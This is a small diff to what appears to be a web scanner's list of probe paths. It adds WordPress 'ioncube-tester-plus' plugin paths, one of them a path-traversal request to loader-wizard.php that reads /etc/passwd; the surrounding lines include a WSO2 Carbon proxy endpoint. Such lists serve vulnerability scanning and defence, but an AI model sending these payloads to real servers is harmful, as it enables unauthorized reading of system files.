@@ -165,3 +165,5 @@
 /carbon/admin/jsp/WSRequestXSSproxy_ajaxprocessor.jsp;b=.jar?uri={{uri_b64}}&pattern=%7E&username=%7E&password=%7E&payload=%7E
 /scim/v2/Users
 /api/scim/v2/Users
+/wp-content/plugins/ioncube-tester-plus/readme.txt
+/wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
